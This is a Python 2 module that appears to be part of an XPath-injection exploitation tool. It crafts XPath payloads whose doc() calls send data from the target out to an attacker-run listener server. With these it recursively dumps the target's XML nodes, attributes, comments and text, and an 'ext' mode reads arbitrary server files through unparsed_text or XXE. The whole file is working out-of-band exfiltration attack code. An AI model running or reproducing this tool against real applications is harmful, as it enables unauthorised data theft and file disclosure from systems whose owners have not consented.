import sys
import socket
import time
import errno
import urllib
from subprocess import Popen, PIPE
#-------------------------------------------------------------------------------
from XPath_functions import count  # 1
from XPath_functions import string_length  # 2
from XPath_functions import substring  # 3
from XPath_functions import doc  # 4
from XPath_functions import unparsed_text  # 5
from XPath_functions import reverse  # 6
from XPath_functions import concat2  # 7
from XPath_functions import concat3  # 8
from XPath_functions import using_doc  # 9
from XPath_functions import encode_for_uri  # 10
from XPath_functions import simple_count  # 11
from XPath_functions import if_then  # 12
from XPath_functions import string  # 13
from XPath_functions import xxe_doc  # 14
from XPath_functions import url  # 15
from XPath_functions import more_then  # 16
#-------------------------------------------------------------------------------
from XPath_elements import name  # 1
from XPath_elements import nodes  # 2
from XPath_elements import node  # 3
from XPath_elements import text  # 4
from XPath_elements import arguments  # 5
from XPath_elements import argument  # 6
from XPath_elements import comments  # 7
from XPath_elements import comment  # 8
from XPath_elements import namespace_uri  # 9
from XPath_elements import processing_instructions  # 10
from XPath_elements import processing_instruction  # 11
from XPath_elements import NODE  # 12
from XPath_elements import ARG  # 13
from XPath_elements import COMM  # 14
from XPath_elements import PRIN  # 15
#-------------------------------------------------------------------------------
from templates import base_templates, template, choose_tag, choose_tag1
from network_connection import NETCON
#-------------------------------------------------------------------------------
DEBUG = False
################################################################################


################################################################################
def rb_test(_netcon,        _proc,      _r, t, _doc):  # rb_test
    for i in t:
        if DEBUG:
            print '[\033[95mBEFORE_ECHO\033[92m]'
        _proc.stdin.write('echo\n')
        _proc.stdin.flush()
        if DEBUG:
            print '[\033[95mBEFORE_S\033[92m]'
        # s = template(i,count(doc(concat2(url(_r[0],_r[1]),encode_for_uri(string(\
        #            simple_count(nodes(''))))))+nodes(''),1))
        s = template(i, doc(concat2(url(_r[0], _r[1]), encode_for_uri(string(
            simple_count(nodes(_doc)))))))
        if DEBUG:
            print '[\033[95mAFTER_S\033[92m]'
        s = choose_tag(i, s)

        _netcon.request(s)
        res = _proc.stdout.readline()
        if DEBUG:
            print '[\033[95mRES\033[92m]', res
        if res.split("TAG", 1)[0] != 'NOCON':
            if 'Err' in res.split("TAG", 1)[0][:10]:
                print("[\033[91mERROR\033[92m]: Socket resource is unreachable."
                      + " Please, wait some time or use another port.")
                exit()
            _proc.stdin.write('echo\n')
            _proc.stdin.flush()
            print '[\033[94mINFO\033[92m]: request-based available :', _r, i[0], i[1]
            return True, i
    print '[\033[94mINFO\033[92m]: request-based vulnerability not found :', _r
    return False, None
#-------------------------------------------------------------------------------


def request(_netcon,        _proc,      s):  # request
    if DEBUG:
        print '[\033[95mBEFORE_ECHO\033[92m]'
    _proc.stdin.write('echo\n')
    _proc.stdin.flush()
    if DEBUG:
        print '[\033[95mBEFORE_NETCON\033[92m]', s
    time.sleep(0.1)
    _netcon.request(s)
    res = _proc.stdout.readline()
    if DEBUG:
        print '[\033[95mRES\033[92m]', res
    list = res.split("TAG", 1)
    if DEBUG:
        print '[\033[95mLIST\033[92m]', list
    if list[0][:5] != 'NOCON':
        if 1 == len(list):
            print("[\033[91mERROR\033[92m]: Format error of data,"
                  + " can't use url encoding.")
            exit()
        # print urllib.unquote(list[1]).decode('utf8')
        return list[0], list[1]
    print "[\033[91mERROR\033[92m]: No connection to listening server."
    _proc.stdin.write('false\n')
    _proc.stdin.flush()
    exit()
#-------------------------------------------------------------------------------


def text_cycle(_netcon,        _proc,      _r, t,  path):  # text_cycle
    s0 = encode_for_uri(concat3(simple_count(text(path)),
                                '{tag}TAG{tag}', text(path)))
    s = template(t, more_then(doc(concat2(url(_r[0], _r[1]), s0)) + nodes('')))
    s = choose_tag(t, s)
    # print text(path)
    amount, data = request(_netcon,    _proc,  s)
    if int(amount) == 1:
        return data
    return None
#-------------------------------------------------------------------------------


def argument_cycle(_netcon,        _proc,      _r, t,  path):  # argument_cycle
    A = ARG()
    s0 = encode_for_uri(concat2(simple_count(A.S(path)), '{tag}TAG{tag}'))
    s = template(t, more_then(doc(concat2(url(_r[0], _r[1]), s0)) + nodes('')))
    s = choose_tag(t, s)

    amount, data = request(_netcon,    _proc,  s)
    res = ""
    i = 1  # init i
    while i <= int(amount):
        s0 = encode_for_uri(
            concat3(name(A.E(path, i)), '{tag}TAG{tag}', A.E(path, i)))
        s = template(t, more_then(
            doc(concat2(url(_r[0], _r[1]), s0)) + nodes('')))
        s = choose_tag(t, s)

        data1, data2 = request(_netcon,    _proc,  s)
        res = res + ' ' + data1 + '="' + data2[:-1] + '"'
        i = i + 1
    return res
#-------------------------------------------------------------------------------


def proc_cycle(_netcon,        _proc,      _r, t,  path,    tab):  # argument_cycle
    P = PRIN()
    s0 = encode_for_uri(concat2(simple_count(P.S(path)), '{tag}TAG{tag}'))
    s = template(t, more_then(doc(concat2(url(_r[0], _r[1]), s0)) + nodes('')))
    s = choose_tag(t, s)

    amount, data = request(_netcon,    _proc,  s)
    i = 1  # init i
    while i <= int(amount):
        s0 = encode_for_uri(
            concat3(name(P.E(path, i)), '{tag}TAG{tag}', P.E(path, i)))
        s = template(t, more_then(
            doc(concat2(url(_r[0], _r[1]), s0)) + nodes('')))
        s = choose_tag(t, s)

        data1, data2 = request(_netcon,    _proc,  s)
        print tab + '<?' + data1 + ' ' + data2[:-1] + '?>'
        i = i + 1
    return
#-------------------------------------------------------------------------------


def comment_cycle(_netcon,        _proc,      _r, t,  path,    tab):  # argument_cycle
    C = COMM()
    s0 = encode_for_uri(concat2(simple_count(C.S(path)), '{tag}TAG{tag}'))
    s = template(t, more_then(doc(concat2(url(_r[0], _r[1]), s0)) + nodes('')))
    s = choose_tag(t, s)

    amount, data = request(_netcon,    _proc,  s)
    i = 1  # init i
    while i <= int(amount):
        s0 = encode_for_uri(concat2(C.E(path, i)), '{tag}TAG{tag}')
        s = template(t, more_then(
            doc(concat2(url(_r[0], _r[1]), s0)) + nodes('')))
        s = choose_tag(t, s)

        tmp, data = request(_netcon,    _proc,  s)
        print tab + '<!--' + data[:-1] + '-->'
        i = i + 1
    return
#-------------------------------------------------------------------------------


def recursive_descent(_netcon,        _proc,      _r, t,  path, _deep):  # recursive_descent
    if DEBUG:
        print '[\033[95mIR_REQ\033[92m]'
    N = NODE()
    s0 = encode_for_uri(concat3(simple_count(N.S(path)),
                                '{tag}TAG{tag}', name(N.E(path, 1))))
    s = template(t, more_then(doc(concat2(url(_r[0], _r[1]), s0)) + nodes('')))
    s = choose_tag(t, s)

    amount, data = request(_netcon,    _proc,  s)
    if not amount.isdigit():
        '[\033[91mERROR\033[92m]: Response data is not integer.'
        exit()
    if int(amount) < 1:
        return

    i = 1  # init i
    tab = _deep * '\t'
    _deep = _deep + 1
    while i <= int(amount):
        first_node = tab + '<' + data[:-1]
        find_node = tab + '<' + data[:-1]
        first_node = first_node + \
            argument_cycle(_netcon, _proc, _r, t, N.E(path, i))
        print first_node + '>'

        res = text_cycle(_netcon,    _proc,  _r, t,  N.E(path, i))
        if res != None:
            print tab + '\t' + res[:-1]
            print find_node + '/>'
            i = i + 1
            continue

        comment_cycle(_netcon,        _proc,      _r, t,  path,    tab)
        proc_cycle(_netcon,        _proc,      _r, t,  path,    tab)

        recursive_descent(_netcon,    _proc,  _r, t,  N.E(path, i), _deep)

        if DEBUG:
            print '[\033[95mNEXT_STEP\033[92m]', i + 1
        s0 = encode_for_uri(name(N.E(path, i)))
        s = template(t, more_then(doc(concat2(url(_r[0], _r[1]), s0))))
        s = choose_tag(t, s)

        tmp, data = request(_netcon,    _proc,  s)
        print find_node + '/>'
        i = i + 1  # i++
    return
#-------------------------------------------------------------------------------


def rb_scan(_netcon,    _proc,      _r, t, _doc):  # rb_scan
    try:
        if DEBUG:
            print '[\033[95mBEFORE_TEST\033[92m]'
        result = rb_test(_netcon,     _proc,      _r, t, _doc)
        if not result[0]:
            return

        recursive_descent(_netcon,    _proc,  _r, result[1], _doc, 0)

        return
    except Exception, e:
        print e
        pass
#-------------------------------------------------------------------------------


def rb_ext(_netcon,    _proc,      _r, t, _doc):  # rb_ext
    try:
        if DEBUG:
            print '[\033[95mBEFORE_TEST\033[92m]'
        result = rb_test(_netcon,     _proc,      _r, t, 'root()')
        if not result[0]:
            return

        s0 = encode_for_uri(_doc)
        s = template(result[1], more_then(doc(concat2(url(_r[0], _r[1]), s0))))
        s = choose_tag(result[1], s)
        s = choose_tag1(result[1], s)

        tmp, data = request(_netcon,    _proc,  s)
        print data

        return
    except Exception, e:
        print e
        pass
#-------------------------------------------------------------------------------


def rb_method(r,          _netcon,    _function,  t, _doc):  # rb_method
    try:
        if DEBUG:
            print '[\033[95mBEFORE_PROC\033[92m]'
        proc = Popen("python server/echo_server.py %s %s" % (r[0], r[1]),
                     shell=True, stdout=PIPE, stderr=PIPE, stdin=PIPE)
        if DEBUG:
            print '[\033[95mBEFORE_FUNCTION\033[92m]'
        result = _function(_netcon,    proc,   r,  t, _doc)
        proc.stdin.write('false\n')
        proc.stdin.flush()
        return result
    except IOError as e:
        if e.errno == errno.EPIPE:
            print("[\033[91mERROR\033[92m]: Can't run server."
                  + " You must have privileges to start server.")
        else:
            proc.terminate()
            pass
    except Exception, e:
        print e
        proc.terminate()
        pass
################################################################################


################################################################################
def test(_settings,  _netcon, _doc):  # test
    if DEBUG:
        print '[\033[95mSTART\033[92m]'
    try:
        if DEBUG:
            print '[\033[95mIN_TRY\033[92m]'
        if _settings.available('template'):
            _t = [_settings.get('template')]
            if '"' in _t[0][1]:
                _t[0].append('"')
            else:
                _t[0].append('\'')
        else:
            _t = base_templates
        if DEBUG:
            print '[\033[95mAFTER_TEMPLATES\033[92m]'
        if _settings.available('r'):
            print '[\033[94mINFO\033[92m]: request-based checking ...'
            rb_method(_settings.get('r'), _netcon,    rb_test,    _t, _doc)
        if DEBUG:
            print '[\033[95mAFTER_IF\033[92m]'
    except:
        print "[\033[91mERROR\033[92m]: Unexpected termination of the program from request_tester"
        exit()
#-------------------------------------------------------------------------------


def scan(_settings,  _netcon, _doc):  # scan
    if DEBUG:
        print '[\033[95mSTART\033[92m]'

    try:
        if DEBUG:
            print '[\033[95mIN_TRY\033[92m]'
        if _settings.available('template'):
            _t = [_settings.get('template')]
            if '"' in _t[0][1]:
                _t[0].append('"')
            else:
                _t[0].append('\'')
        else:
            _t = base_templates
        if DEBUG:
            print '[\033[95mAFTER_TEMPLATES\033[92m]'
        if _settings.available('r'):
            print '[\033[94mINFO\033[92m]: request-based checking ...'
            rb_method(_settings.get('r'), _netcon,    rb_scan,    _t, _doc)
        if DEBUG:
            print '[\033[95mAFTER_IF\033[92m]'
        return
    except:
        print "[\033[91mERROR\033[92m]: Unexpected termination of the program from request_tester"
        exit()
#-------------------------------------------------------------------------------


def ext(_settings,  _netcon, _doc):  # scan
    if DEBUG:
        print '[\033[95mSTART\033[92m]'

    try:
        if DEBUG:
            print '[\033[95mIN_TRY\033[92m]'
        if _settings.available('template'):
            _t = [_settings.get('template')]
            if '"' in _t[0][1]:
                _t[0].append('"')
            else:
                _t[0].append('\'')
        else:
            _t = base_templates

        if _settings.get('ext') == 'XXE':
            print _settings.get('ext')
            _doc = xxe_doc(_settings.get('file'))
        else:
            print _settings.get('ext')
            _doc = unparsed_text(_settings.get('file'))

        if DEBUG:
            print '[\033[95mAFTER_TEMPLATES\033[92m]'
        if _settings.available('r'):
            print '[\033[94mINFO\033[92m]: request-based checking ...'
            rb_method(_settings.get('r'), _netcon,    rb_ext,    _t, _doc)
        if DEBUG:
            print '[\033[95mAFTER_IF\033[92m]'
        return
    except:
        print "[\033[91mERROR\033[92m]: Unexpected termination of the program from request_tester"
        exit()
